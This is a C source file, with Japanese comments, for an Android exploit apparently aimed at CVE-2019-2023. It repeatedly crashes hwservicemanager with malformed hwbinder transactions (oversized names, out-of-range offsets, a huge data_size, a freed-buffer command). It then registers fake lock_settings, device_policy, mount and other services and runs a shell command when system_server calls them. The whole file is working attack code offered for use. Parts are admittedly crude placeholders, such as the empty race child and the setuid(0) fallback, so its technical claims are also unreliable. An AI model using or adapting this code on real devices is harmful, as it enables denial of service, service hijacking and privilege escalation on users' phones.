#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/ptrace.h>
#include <sys/mman.h>
#include <signal.h>
#include <stdint.h>
#include <sched.h>
#include <poll.h>
#include <sys/prctl.h>
#include <sys/stat.h>
#include <time.h>
#include <sys/syscall.h>
#include <dirent.h>
#include <arpa/inet.h>
#include "binder.h"

// ============================================================
// プロトタイプ宣言
// ============================================================
static void dump_hex(FILE *fp, const uint8_t *data, size_t len);
static void log_transaction(const char *msg, struct binder_transaction_data *t, const uint8_t *data);
static int write_file(const char *path, const char *data);
static pid_t get_hwservicemanager_pid(void);
static int crash_hwservicemanager(void);
static int exploit_cve_2019_2023(const char *service_name);
static int binder_server_loop(int binder_fd, int expected_handle);
static void register_and_serve(const char *service_name);
static int send_malformed_transaction(void);
static int send_huge_data_transaction(void);
static int send_free_buffer_after_use(void);
static int fallback_setuid(void);

// ============================================================
// 設定
// ============================================================
#define OUTPUT_FILE    "/data/local/tmp/cve_2019_2023_result.txt"
#define LOG_FILE       "/data/local/tmp/binder_traffic.log"
#define SHELL_PATH     "/system/bin/sh"

// 乗っ取り対象サービスリスト
static const char *target_services[] = {
    "vendor.qti.hardware.servicetracker@1.0::IServicetracker/default",
    "android.hardware.power@1.0::IPower/default",
    "persistent_data_block",
    "device_policy",
    "lock_settings",
    "mount",
    NULL
};

static volatile int race_ready = 0;
static int g_exploit_success = 0;
static pid_t g_hwservicemanager_pid = 0;

// ============================================================
// ユーティリティ
// ============================================================
static void dump_hex(FILE *fp, const uint8_t *data, size_t len) {
    for (size_t i = 0; i < len; i++) {
        fprintf(fp, "%02x ", data[i]);
        if ((i+1) % 16 == 0) fprintf(fp, "\n");
    }
    fprintf(fp, "\n");
}

static void log_transaction(const char *msg, struct binder_transaction_data *t, const uint8_t *data) {
    FILE *fp = fopen(LOG_FILE, "a");
    if (!fp) fp = stderr;
    fprintf(fp, "[%ld] %s\n", time(NULL), msg);
    fprintf(fp, "  handle=%d code=0x%x flags=0x%x data_size=%zu offsets_size=%zu\n",
            t->target.handle, t->code, t->flags, (size_t)t->data_size, (size_t)t->offsets_size);
    if (data && t->data_size > 0) {
        fprintf(fp, "  data (%zu bytes):\n", (size_t)t->data_size);
        dump_hex(fp, data, t->data_size > 512 ? 512 : t->data_size);
    }
    if (fp != stderr) fclose(fp);
}

static int write_file(const char *path, const char *data) {
    int fd = open(path, O_WRONLY | O_CREAT | O_TRUNC, 0644);
    if (fd < 0) return -1;
    ssize_t n = write(fd, data, strlen(data));
    close(fd);
    return (n == (ssize_t)strlen(data)) ? 0 : -1;
}

static pid_t get_hwservicemanager_pid(void) {
    FILE *fp = popen("pidof hwservicemanager", "r");
    if (!fp) return -1;
    char pid_str[16];
    if (!fgets(pid_str, sizeof(pid_str), fp)) {
        pclose(fp);
        return -1;
    }
    pclose(fp);
    pid_t pid = atoi(pid_str);
    if (pid <= 0) return -1;
    return pid;
}

// ============================================================
// CVE-2019-2023 基本登録（レース付き）
// ============================================================
static int exploit_cve_2019_2023(const char *service_name) {
    int hwbinder_fd, ret;
    uint8_t read_buf[4096];
    size_t name_len = strlen(service_name) + 1;
    size_t total_len = 4 + name_len;
    uint8_t *data;
    int handle = -1;
    pid_t child;

    printf("[*] CVE-2019-2023: registering '%s'...\n", service_name);

    // レース用に子プロセスをフォーク（実際のレースは単純ではない）
    child = fork();
    if (child == 0) {
        while (!race_ready) usleep(100);
        // 子は何もしない（本来は exec でコンテキスト変更）
        exit(0);
    } else if (child < 0) {
        perror("  fork");
        return -1;
    }

    usleep(200000); // レースウィンドウ

    hwbinder_fd = open("/dev/hwbinder", O_RDWR);
    if (hwbinder_fd < 0) {
        perror("  open /dev/hwbinder");
        kill(child, SIGKILL);
        return -1;
    }

    data = malloc(total_len);
    if (!data) {
        perror("  malloc");
        close(hwbinder_fd);
        kill(child, SIGKILL);
        return -1;
    }
    data[0] = (uint8_t)(name_len & 0xFF);
    data[1] = (uint8_t)((name_len >> 8) & 0xFF);
    data[2] = (uint8_t)((name_len >> 16) & 0xFF);
    data[3] = (uint8_t)((name_len >> 24) & 0xFF);
    memcpy(data + 4, service_name, name_len);

    struct {
        uint32_t cmd;
        struct binder_transaction_data tdata;
    } __attribute__((packed)) tx;
    tx.cmd = BC_TRANSACTION;
    tx.tdata.target.handle = 0;
    tx.tdata.code = 2;                     // ADD_SERVICE
    tx.tdata.flags = 0;
    tx.tdata.data_size = total_len;
    tx.tdata.offsets_size = 0;
    tx.tdata.data.ptr.buffer = (binder_uintptr_t)data;

    struct binder_write_read bwr;
    memset(&bwr, 0, sizeof(bwr));
    bwr.write_size = sizeof(tx);
    bwr.write_buffer = (binder_uintptr_t)&tx;
    bwr.read_size = sizeof(read_buf);
    bwr.read_buffer = (binder_uintptr_t)read_buf;

    race_ready = 1;
    usleep(50000);

    ret = ioctl(hwbinder_fd, BINDER_WRITE_READ, &bwr);
    free(data);
    if (ret < 0) {
        perror("  ioctl ADD_SERVICE");
        close(hwbinder_fd);
        kill(child, SIGKILL);
        return -1;
    }
    printf("  [+] ADD_SERVICE succeeded!\n");

    kill(child, SIGKILL);
    waitpid(child, NULL, 0);

    // GET_SERVICE でハンドル取得
    data = malloc(total_len);
    if (!data) {
        close(hwbinder_fd);
        return -1;
    }
    data[0] = (uint8_t)(name_len & 0xFF);
    data[1] = (uint8_t)((name_len >> 8) & 0xFF);
    data[2] = (uint8_t)((name_len >> 16) & 0xFF);
    data[3] = (uint8_t)((name_len >> 24) & 0xFF);
    memcpy(data + 4, service_name, name_len);

    tx.tdata.code = 1;                     // GET_SERVICE
    tx.tdata.data_size = total_len;
    tx.tdata.data.ptr.buffer = (binder_uintptr_t)data;

    memset(&bwr, 0, sizeof(bwr));
    bwr.write_size = sizeof(tx);
    bwr.write_buffer = (binder_uintptr_t)&tx;
    bwr.read_size = sizeof(read_buf);
    bwr.read_buffer = (binder_uintptr_t)read_buf;

    ret = ioctl(hwbinder_fd, BINDER_WRITE_READ, &bwr);
    free(data);
    if (ret < 0) {
        perror("  ioctl GET_SERVICE");
        close(hwbinder_fd);
        return -1;
    }
    if (bwr.read_consumed < 4) {
        printf("  [-] No handle returned\n");
        close(hwbinder_fd);
        return -1;
    }
    handle = *(int*)read_buf;
    printf("  [+] Service handle: %d\n", handle);
    close(hwbinder_fd);
    return handle;
}

// ============================================================
// クラッシュベクター1：巨大サービス名（8KB）
// ============================================================
static int crash_with_huge_name(void) {
    printf("[*] Trying crash with 8KB service name...\n");
    char *payload = malloc(8192);
    if (!payload) return -1;
    memset(payload, 'A', 8191);
    payload[8191] = '\0';
    int ret = exploit_cve_2019_2023(payload);
    free(payload);
    return ret;
}

// ============================================================
// クラッシュベクター2：無効なオフセットを含むトランザクション
// ============================================================
static int send_malformed_transaction(void) {
    printf("[*] Sending malformed transaction with invalid offsets...\n");
    int hwbinder_fd = open("/dev/hwbinder", O_RDWR);
    if (hwbinder_fd < 0) {
        perror("  open");
        return -1;
    }

    // データとオフセット配列を用意（データサイズを超えるオフセット）
    uint8_t *data = malloc(4096);
    if (!data) { close(hwbinder_fd); return -1; }
    memset(data, 0x41, 4096);

    binder_size_t offsets[10];
    for (int i = 0; i < 10; i++) {
        offsets[i] = 8192 + i * 8; // データ範囲外
    }

    struct {
        uint32_t cmd;
        struct binder_transaction_data tdata;
    } __attribute__((packed)) tx;
    tx.cmd = BC_TRANSACTION;
    tx.tdata.target.handle = 0;
    tx.tdata.code = 0;
    tx.tdata.flags = 0;
    tx.tdata.data_size = 4096;
    tx.tdata.offsets_size = sizeof(offsets);
    tx.tdata.data.ptr.buffer = (binder_uintptr_t)data;
    tx.tdata.data.ptr.offsets = (binder_uintptr_t)offsets;

    struct binder_write_read bwr;
    memset(&bwr, 0, sizeof(bwr));
    bwr.write_size = sizeof(tx);
    bwr.write_buffer = (binder_uintptr_t)&tx;
    bwr.read_size = 4096;
    bwr.read_buffer = (binder_uintptr_t)malloc(4096);
    if (!bwr.read_buffer) { free(data); close(hwbinder_fd); return -1; }

    int ret = ioctl(hwbinder_fd, BINDER_WRITE_READ, &bwr);
    free(data);
    free((void*)bwr.read_buffer);
    close(hwbinder_fd);
    if (ret < 0) {
        perror("  ioctl");
        return -1;
    }
    printf("  [+] Malformed transaction sent.\n");
    return 0;
}

// ============================================================
// クラッシュベクター3：極端に大きな data_size
// ============================================================
static int send_huge_data_transaction(void) {
    printf("[*] Sending transaction with huge data_size...\n");
    int hwbinder_fd = open("/dev/hwbinder", O_RDWR);
    if (hwbinder_fd < 0) {
        perror("  open");
        return -1;
    }

    struct {
        uint32_t cmd;
        struct binder_transaction_data tdata;
    } __attribute__((packed)) tx;
    tx.cmd = BC_TRANSACTION;
    tx.tdata.target.handle = 0;
    tx.tdata.code = 0;
    tx.tdata.flags = 0;
    tx.tdata.data_size = 0xFFFFFFFF; // 巨大
    tx.tdata.offsets_size = 0;
    tx.tdata.data.ptr.buffer = 0;
    tx.tdata.data.ptr.offsets = 0;

    struct binder_write_read bwr;
    memset(&bwr, 0, sizeof(bwr));
    bwr.write_size = sizeof(tx);
    bwr.write_buffer = (binder_uintptr_t)&tx;
    bwr.read_size = 4096;
    bwr.read_buffer = (binder_uintptr_t)malloc(4096);
    if (!bwr.read_buffer) { close(hwbinder_fd); return -1; }

    int ret = ioctl(hwbinder_fd, BINDER_WRITE_READ, &bwr);
    free((void*)bwr.read_buffer);
    close(hwbinder_fd);
    if (ret < 0) {
        perror("  ioctl");
        return -1;
    }
    printf("  [+] Huge data transaction sent.\n");
    return 0;
}

// ============================================================
// クラッシュベクター4：BC_FREE_BUFFER で解放済みバッファを参照
// ============================================================
static int send_free_buffer_after_use(void) {
    printf("[*] Trying to free buffer after use (UAF attempt)...\n");
    // まず適当なトランザクションを送信してバッファを確保
    int hwbinder_fd = open("/dev/hwbinder", O_RDWR);
    if (hwbinder_fd < 0) { perror("  open"); return -1; }

    uint8_t *data = malloc(1024);
    if (!data) { close(hwbinder_fd); return -1; }
    memset(data, 0x42, 1024);

    struct {
        uint32_t cmd;
        struct binder_transaction_data tdata;
    } __attribute__((packed)) tx;
    tx.cmd = BC_TRANSACTION;
    tx.tdata.target.handle = 0;
    tx.tdata.code = 0;
    tx.tdata.flags = 0;
    tx.tdata.data_size = 1024;
    tx.tdata.offsets_size = 0;
    tx.tdata.data.ptr.buffer = (binder_uintptr_t)data;

    struct binder_write_read bwr;
    memset(&bwr, 0, sizeof(bwr));
    bwr.write_size = sizeof(tx);
    bwr.write_buffer = (binder_uintptr_t)&tx;
    bwr.read_size = 4096;
    bwr.read_buffer = (binder_uintptr_t)malloc(4096);
    if (!bwr.read_buffer) { free(data); close(hwbinder_fd); return -1; }

    int ret = ioctl(hwbinder_fd, BINDER_WRITE_READ, &bwr);
    if (ret < 0) { free(data); free((void*)bwr.read_buffer); close(hwbinder_fd); return -1; }

    // 応答からバッファのポインタを取得（簡易的に read_buffer のデータから推測するのは難しい）
    // ここでは単に BC_FREE_BUFFER に適当なアドレスを送ってみる
    struct {
        uint32_t cmd;
        binder_uintptr_t ptr;
    } __attribute__((packed)) free_cmd;
    free_cmd.cmd = BC_FREE_BUFFER;
    free_cmd.ptr = 0xdeadbeef; // 無効なアドレス

    memset(&bwr, 0, sizeof(bwr));
    bwr.write_size = sizeof(free_cmd);
    bwr.write_buffer = (binder_uintptr_t)&free_cmd;
    bwr.read_size = 4096;
    bwr.read_buffer = (binder_uintptr_t)malloc(4096);
    if (!bwr.read_buffer) { free(data); close(hwbinder_fd); return -1; }

    ret = ioctl(hwbinder_fd, BINDER_WRITE_READ, &bwr);
    free(data);
    free((void*)bwr.read_buffer);
    close(hwbinder_fd);
    if (ret < 0) {
        perror("  ioctl BC_FREE_BUFFER");
        return -1;
    }
    printf("  [+] Free buffer command sent.\n");
    return 0;
}

// ============================================================
// 複合クラッシュ攻撃
// ============================================================
static int crash_hwservicemanager(void) {
    printf("[*] Attempting multiple crash vectors...\n");
    int ret = 0;
    ret |= crash_with_huge_name();
    usleep(200000);
    ret |= send_malformed_transaction();
    usleep(200000);
    ret |= send_huge_data_transaction();
    usleep(200000);
    ret |= send_free_buffer_after_use();
    usleep(200000);

    // クラッシュ確認
    pid_t new_pid = get_hwservicemanager_pid();
    if (new_pid != g_hwservicemanager_pid && new_pid > 0) {
        printf("[+] hwservicemanager crashed and restarted! New PID: %d\n", new_pid);
        g_hwservicemanager_pid = new_pid;
        return 0;
    } else {
        printf("[-] hwservicemanager did not crash (still PID %d)\n", g_hwservicemanager_pid);
        return -1;
    }
}

// ============================================================
// Binder サーバーループ（改良版：トランザクション処理を強化）
// ============================================================
static int binder_server_loop(int binder_fd, int expected_handle) {
    uint8_t read_buf[4096];
    struct binder_write_read bwr;
    int ret;
    int transaction_count = 0;

    printf("[*] Starting Binder server loop for handle %d...\n", expected_handle);
    printf("[*] Waiting for transactions...\n");

    while (1) {
        memset(&bwr, 0, sizeof(bwr));
        bwr.read_size = sizeof(read_buf);
        bwr.read_buffer = (binder_uintptr_t)read_buf;

        ret = ioctl(binder_fd, BINDER_WRITE_READ, &bwr);
        if (ret < 0) {
            perror("  ioctl read");
            break;
        }
        if (bwr.read_consumed == 0) {
            usleep(100000);
            continue;
        }

        uint32_t *cmd = (uint32_t*)read_buf;
        uint32_t cmd_code = *cmd;
        uint8_t *payload = read_buf + sizeof(uint32_t);
        size_t payload_size = bwr.read_consumed - sizeof(uint32_t);

        // BR_NOOP は無視
        if (cmd_code == 0x720c) {
            fprintf(stderr, "[SERVER] BR_NOOP ignored.\n");
            continue;
        }

        fprintf(stderr, "[SERVER] Received cmd=0x%x (%d), size=%zu\n", cmd_code, cmd_code, payload_size);

        if (cmd_code == BR_TRANSACTION || cmd_code == BR_TRANSACTION_SEC_CTX) {
            struct binder_transaction_data *t = (struct binder_transaction_data*)payload;
            size_t data_size = t->data_size;
            uint8_t *data_ptr = NULL;
            if (data_size > 0 && data_size < 4096) {
                data_ptr = malloc(data_size);
                if (data_ptr) {
                    // ユーザ空間ポインタからデータをコピー（実際は安全でないが PoC）
                    memcpy(data_ptr, (uint8_t*)(uintptr_t)t->data.ptr.buffer, data_size);
                }
            }
            log_transaction("Incoming transaction", t, data_ptr);
            if (data_ptr) free(data_ptr);

            // system_server (uid=1000) からの呼び出しを検知
            if (t->sender_euid == 1000) {
                printf("[SERVER] ***** system_server CALLED OUR SERVICE! (uid=1000) *****\n");
                pid_t pid = fork();
                if (pid == 0) {
                    int fd = open(OUTPUT_FILE, O_WRONLY | O_CREAT | O_TRUNC, 0644);
                    if (fd >= 0) {
                        dup2(fd, STDOUT_FILENO);
                        dup2(fd, STDERR_FILENO);
                        close(fd);
                    }
                    execl(SHELL_PATH, "sh", "-c", "id; getenforce; echo '=== CVE-2019-2023 EXPLOITED ==='", NULL);
                    exit(1);
                } else if (pid > 0) {
                    wait(NULL);
                    printf("[SERVER] id command executed. Check %s\n", OUTPUT_FILE);
                }
                g_exploit_success = 1;
            } else {
                printf("[SERVER] Sender uid=%d (ignoring)\n", t->sender_euid);
            }

            // 応答を返す（BR_OK と BR_TRANSACTION_COMPLETE）
            struct {
                uint32_t cmd;
                uint32_t status;
            } __attribute__((packed)) reply;
            reply.cmd = BR_OK;
            reply.status = 0;

            struct binder_write_read write_bwr;
            memset(&write_bwr, 0, sizeof(write_bwr));
            write_bwr.write_size = sizeof(reply);
            write_bwr.write_buffer = (binder_uintptr_t)&reply;

            ret = ioctl(binder_fd, BINDER_WRITE_READ, &write_bwr);
            if (ret < 0) perror("  ioctl write reply");

            uint32_t complete_cmd = BR_TRANSACTION_COMPLETE;
            write_bwr.write_size = sizeof(complete_cmd);
            write_bwr.write_buffer = (binder_uintptr_t)&complete_cmd;
            ioctl(binder_fd, BINDER_WRITE_READ, &write_bwr);

            transaction_count++;
            printf("[SERVER] Transaction #%d handled.\n", transaction_count);
        } else if (cmd_code == BR_DEAD_BINDER) {
            printf("[SERVER] Received DEAD_BINDER\n");
            break;
        } else {
            fprintf(stderr, "[SERVER] Unhandled cmd=0x%x\n", cmd_code);
            // その他のコマンドにも応答を返さないとデッドロックする可能性がある
        }
    }
    return transaction_count;
}

// ============================================================
// サービス登録 + サーバー起動
// ============================================================
static void register_and_serve(const char *service_name) {
    int handle = exploit_cve_2019_2023(service_name);
    if (handle < 0) {
        printf("[-] Failed to register '%s'\n", service_name);
        return;
    }
    printf("[+] Registered '%s' (handle %d)\n", service_name, handle);

    int binder_fd = open("/dev/hwbinder", O_RDWR);
    if (binder_fd < 0) {
        perror("  open /dev/hwbinder for server");
        return;
    }

    // BC_ENTER_LOOPER を送信
    uint32_t cmd = BC_ENTER_LOOPER;
    struct binder_write_read bwr;
    memset(&bwr, 0, sizeof(bwr));
    bwr.write_size = sizeof(cmd);
    bwr.write_buffer = (binder_uintptr_t)&cmd;
    if (ioctl(binder_fd, BINDER_WRITE_READ, &bwr) < 0) {
        perror("  BC_ENTER_LOOPER");
        close(binder_fd);
        return;
    }

    pid_t pid = fork();
    if (pid == 0) {
        // 子プロセスでサーバーループ実行
        binder_server_loop(binder_fd, handle);
        exit(0);
    } else if (pid > 0) {
        printf("[+] Binder server for '%s' running (PID %d)\n", service_name, pid);
        close(binder_fd); // 親は閉じる
    } else {
        perror("  fork server");
        close(binder_fd);
    }
}

// ============================================================
// フォールバック（古典的 setuid）
// ============================================================
static int fallback_setuid(void) {
    printf("[*] Fallback: trying setuid(0)...\n");
    if (setuid(0) == 0 || setresuid(0,0,0) == 0) {
        printf("[+] setuid(0) succeeded!\n");
        return 0;
    }
    return -1;
}

// ============================================================
// メイン
// ============================================================
int main(void) {
    printf("============================================================\n");
    printf("  CVE-2019-2023 Ultimate Exploit - Multi-Vector Crash & Hijack\n");
    printf("============================================================\n\n");

    // ログ初期化
    FILE *fp = fopen(LOG_FILE, "w");
    if (fp) {
        fprintf(fp, "=== Binder Traffic Log ===\n");
        fclose(fp);
        printf("[+] Log file created: %s\n", LOG_FILE);
    }

    // hwservicemanager PID 取得
    g_hwservicemanager_pid = get_hwservicemanager_pid();
    if (g_hwservicemanager_pid <= 0) {
        printf("[-] Could not find hwservicemanager. Continuing anyway...\n");
    } else {
        printf("[+] Current hwservicemanager PID: %d\n", g_hwservicemanager_pid);
    }

    // フェーズ1: クラッシュ攻撃（最大5回試行）
    printf("[*] Phase 1: Crash hwservicemanager with multiple vectors\n");
    int crashed = 0;
    for (int i = 0; i < 5 && !crashed; i++) {
        if (crash_hwservicemanager() == 0) {
            crashed = 1;
        }
        sleep(2);
    }
    if (!crashed) {
        printf("[-] Failed to crash hwservicemanager. Continuing anyway...\n");
    }

    // フェーズ2: 再起動待ち（PID 変更を監視）
    printf("[*] Phase 2: Wait for hwservicemanager restart\n");
    int max_wait = 30;
    while (max_wait-- > 0) {
        pid_t new_pid = get_hwservicemanager_pid();
        if (new_pid > 0 && new_pid != g_hwservicemanager_pid) {
            printf("[+] hwservicemanager restarted with PID: %d\n", new_pid);
            g_hwservicemanager_pid = new_pid;
            break;
        }
        sleep(1);
    }

    // フェーズ3: 全サービス再登録 & サーバー起動
    printf("[*] Phase 3: Register all services and start servers\n");
    for (int i = 0; target_services[i] != NULL; i++) {
        register_and_serve(target_services[i]);
        usleep(300000);
    }

    // フェーズ4: 長時間待機（system_server からの呼び出しを待つ）
    printf("[*] Phase 4: Waiting for system_server to call...\n");
    printf("[*] Running for 180 seconds. Check %s for logs.\n", LOG_FILE);
    sleep(180);

    // 結果表示
    printf("\n[*] Log file content:\n");
    system("cat " LOG_FILE " 2>/dev/null || echo 'No log file found'");

    if (g_exploit_success) {
        printf("[+] Exploit succeeded! Check %s\n", OUTPUT_FILE);
    } else {
        printf("[-] No transaction from system_server received.\n");
        printf("[-] Try manually triggering system events (screen on/off, USB plug, etc.)\n");
        // フォールバック
        if (fallback_setuid() == 0) {
            system("id > " OUTPUT_FILE " 2>&1");
            system("cat " OUTPUT_FILE);
            g_exploit_success = 1;
        }
    }

    printf("\n============================================================\n");
    printf("  Exploit finished. Success: %s\n", g_exploit_success ? "YES" : "NO");
    return g_exploit_success ? 0 : 1;
}
